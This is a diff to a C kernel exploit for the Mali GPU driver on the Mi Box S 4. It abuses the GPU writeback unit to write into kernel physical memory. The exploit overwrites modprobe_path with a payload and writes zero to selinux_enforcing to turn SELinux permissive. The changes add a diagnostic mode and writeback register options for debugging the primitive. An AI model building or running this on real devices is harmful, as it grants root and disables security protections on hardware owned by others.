@@ -217,14 +217,33 @@ typedef struct
 #define FR_SCALE 21
 #define FR_FOUREIGHT 22
 
-/* WB register indices (hardware-defined) */
+/*
+ * WB register indices.
+ *
+ * NOTE (r10p0/r10p1 hardware layout, from mali_pp.c reset values):
+ *   [0] Source Select          (0 = disabled)
+ *   [1] Target Address
+ *   [2] Target Pixel Format
+ *   [3] Target AA Format
+ *   [4] Target Layout
+ *   [5] Target Scanline Length (pitch)
+ *   [6] Target Flags           <-- kort legacy calls this "WB_MRT_BITS"!
+ *   [7] MRT Enable
+ *   [8] MRT Offset
+ *   [9] Global Test Enable
+ *   [10] Global Test Reference Value
+ *   [11] Global Test Compare Function
+ * The kort (r3p2-era) field names below map to different hardware slots on
+ * this r10p1 driver: legacy "WB_MRT_BITS" lands in Target Flags[6].
+ */
 #define WB_TYPE 0
 #define WB_ADDRESS 1
 #define WB_PIXEL_FORMAT 2
 #define WB_DOWNSAMPLE 3
 #define WB_PIXEL_LAYOUT 4
 #define WB_PITCH 5
-#define WB_MRT_BITS 6
+#define WB_MRT_BITS 6      /* legacy name; r10p1 hardware: Target Flags */
+#define WB_MRT_ENABLE 7    /* r10p1: MRT Enable */
 
 /*
  *  PP FRAME SIZE - CRITICAL.
@@ -322,8 +341,15 @@ static int unbind(uint32_t gpu_vaddr)
 /*
  * Submit one PP job: writeback unit copies FR_CLEAR_COLOR_0..3 (all == value)
  * to gpu_target (GPU VA). Returns 0 on PP_FINISHED+SUCCESS.
+ *
+ * wb_cfg  bits (diag knobs, from r10p1 WB register layout):
+ *   bit0: WB enable      (0 -> Source Select=0, WB unit fully disabled)
+ *   bit1: use legacy MRT_BITS=4 in Target Flags[6]  (1 = kort legacy config)
+ *   bit2: set MRT Enable[7] = 4
+ *   bit3: set FR_FRAG_STACK_SIZE = 0x400 (default 0)
  */
-static int wb_write_u32(uint32_t *buf, uint32_t gpu_target, uint32_t value)
+static int wb_write_u32(uint32_t *buf, uint32_t gpu_target, uint32_t value,
+                        uint32_t wb_cfg)
 {
     memset(buf, 0, 0x2000);
 
@@ -359,19 +385,28 @@ static int wb_write_u32(uint32_t *buf, uint32_t gpu_target, uint32_t value)
     job.frame_registers[FR_WIDTH]           = PP_WIDTH;   /* 0x10 */
     job.frame_registers[FR_HEIGHT]          = PP_HEIGHT;  /* 0x10 */
     job.frame_registers[FR_FRAG_STACK_ADDR] = GPU_VA_DATA + OFF_STACK;
-    job.frame_registers[FR_FRAG_STACK_SIZE] = 0;
+    job.frame_registers[FR_FRAG_STACK_SIZE] = (wb_cfg & 0x8) ? 0x400 : 0;
     job.frame_registers[FR_DUBYA]           = 0x77;
     job.frame_registers[FR_BLOCKING]        = 0;
     job.frame_registers[FR_SCALE]           = 0x0C;
     job.frame_registers[FR_FOUREIGHT]       = 0x8888;
 
-    job.wb0_registers[WB_TYPE]         = 0x02;   /* color source */
-    job.wb0_registers[WB_ADDRESS]      = gpu_target;
-    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;   /* RGBA8888 */
-    job.wb0_registers[WB_DOWNSAMPLE]   = 0;
-    job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
-    job.wb0_registers[WB_PITCH]        = WB_PITCH_VAL; /* 8 == 16px*4B/8 */
-    job.wb0_registers[WB_MRT_BITS]     = 4;
+    if (wb_cfg & 0x1) {
+        /* WB enabled: Source Select = 2 (color source) */
+        job.wb0_registers[WB_TYPE]         = 0x02;
+        job.wb0_registers[WB_ADDRESS]      = gpu_target;
+        job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;   /* RGBA8888 */
+        job.wb0_registers[WB_DOWNSAMPLE]   = 0;
+        job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
+        job.wb0_registers[WB_PITCH]        = WB_PITCH_VAL; /* 8 == 16px*4B/8 */
+        if (wb_cfg & 0x2) {
+            job.wb0_registers[WB_MRT_BITS] = 4;   /* legacy kort: into Target Flags[6] */
+        }
+        if (wb_cfg & 0x4) {
+            job.wb0_registers[WB_MRT_ENABLE] = 4; /* MRT Enable[7] */
+        }
+    }
+    /* else: Source Select stays 0 -> WB unit disabled (render-only job) */
 
     job.fence.sync_fd = -1;
     uint32_t tl = 0;
@@ -444,7 +479,7 @@ static int write_modprobe_payload(uint32_t *buf, const char *payload)
                 v |= ((uint32_t)(uint8_t)payload[off]) << (8 * j);
         }
         printf("  [*] WB[%zu] 0x%08x -> modprobe_path+0x%zx\n", i, v, i * 4);
-        int r = wb_write_u32(buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), v);
+        int r = wb_write_u32(buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), v, 0x3);
         if (r != 0) return r;
     }
     return 0;
@@ -458,11 +493,12 @@ int main(int argc, char **argv)
     sigaction(SIGALRM, &sa, NULL);
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    int mode_verify = 0, mode_selinux = 0;
+    int mode_verify = 0, mode_selinux = 0, mode_diag = 0;
     if (argc > 1) {
         if (!strcmp(argv[1], "--verify"))  mode_verify = 1;
         else if (!strcmp(argv[1], "--selinux")) mode_selinux = 1;
-        else { printf("usage: %s [--verify | --selinux]\n", argv[0]); return 1; }
+        else if (!strcmp(argv[1], "--diag")) mode_diag = 1;
+        else { printf("usage: %s [--verify | --selinux | --diag]\n", argv[0]); return 1; }
     }
 
     printf("\n");
@@ -479,7 +515,7 @@ int main(int argc, char **argv)
     printf("\033[0m");
     printf("\n\033[38;5;34m         Mi Box S 4 (MIBOX4 / oneday)\033[0m\n\n");
 
-    printf("[*] mode=%s\n", mode_verify ? "verify" : (mode_selinux ? "selinux" : "modprobe"));
+    printf("[*] mode=%s\n", mode_verify ? "verify" : (mode_selinux ? "selinux" : (mode_diag ? "diag" : "modprobe")));
     printf("[*] KERNEL_PHYS_BASE=0x%08x (fixed, no KASLR leak needed)\n", KERNEL_PHYS_BASE);
     printf("[*] modprobe_path  phys=0x%08x (page 0x%08x + 0x%03x)\n",
            MODPROBE_PATH_PHYS, MODPROBE_PATH_PAGE, MODPROBE_PATH_INPAGE);
@@ -513,7 +549,7 @@ int main(int argc, char **argv)
             printf("[-] BIND failed (%s)\n", strerror(errno)); goto out;
         }
         printf("[+] BIND OK. Writing 0 -> selinux_enforcing+0x%03x\n", inpg);
-        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + inpg, 0);
+        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + inpg, 0, 0x3);
         printf("[%s] selinux_enforcing write: %s\n",
                r == 0 ? "+" : "-", r == 0 ? "OK (SELinux may now be permissive)" : "FAILED");
         goto out;
@@ -529,7 +565,7 @@ int main(int argc, char **argv)
         read_modprobe("before");
 
         printf("[2] WB write '////' (0x2F2F2F2F) -> modprobe_path+0x%03x\n", MODPROBE_PATH_INPAGE);
-        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE, 0x2F2F2F2Fu);
+        r = wb_write_u32((uint32_t *)buf, GPU_VA_TGT + MODPROBE_PATH_INPAGE, 0x2F2F2F2Fu, 0x3);
         if (r != 0) { printf("[-] WB job failed (ret=%d)\n", r); goto out; }
 
         read_modprobe("after-write");
@@ -546,10 +582,40 @@ int main(int argc, char **argv)
         };
         for (int i = 0; i < 4; i++) {
             r = wb_write_u32((uint32_t *)buf,
-                             GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), orig[i]);
+                             GPU_VA_TGT + MODPROBE_PATH_INPAGE + (uint32_t)(i * 4), orig[i], 0x3);
             if (r != 0) { printf("[-] restore[%d] failed (ret=%d)\n", i, r); break; }
         }
         read_modprobe("after-restore");
+        goto out;
+    }
+
+    /* ---- diag mode: discriminate which PP job config causes the error ----
+     * Each test writes to GPU-OWN memory (GPU_VA_DATA+0x3000, no BIND needed)
+     * so we isolate the job-descriptor / WB config problem from the BIND page.
+     * cfg bits: bit0=WB enable, bit1=legacy MRT_BITS=4, bit2=MRT Enable=4,
+     *           bit3=FR_FRAG_STACK_SIZE=0x400
+     */
+    if (mode_diag) {
+        uint32_t verify_gpu = GPU_VA_DATA + 0x3000;
+        const char *names[4] = {
+            "cfg0: WB disabled (render-only)          ",
+            "cfg1: WB on, flags=0, stack=0            ",
+            "cfg2: WB on, legacy MRT_BITS=4 (kort)    ",
+            "cfg3: WB on, MRT_BITS=4 + MRT_Enable=4   ",
+        };
+        uint32_t cfgs[4] = { 0x0, 0x1, 0x3, 0x7 };
+
+        printf("[DIAG] PP job config discrimination (target = GPU-own mem 0x%08x)\n", verify_gpu);
+        for (int i = 0; i < 4; i++) {
+            printf("  %s\n", names[i]);
+            r = wb_write_u32((uint32_t *)buf, verify_gpu, 0x41414141u, cfgs[i]);
+            printf("  -> ret=%d\n\n", r);
+        }
+
+        printf("[DIAG] variant with FR_FRAG_STACK_SIZE=0x400:\n");
+        printf("  cfg4: WB on, flags=0, stack=0x400       \n");
+        r = wb_write_u32((uint32_t *)buf, verify_gpu, 0x42424242u, 0x9);
+        printf("  -> ret=%d\n", r);
         goto out;
     }
 
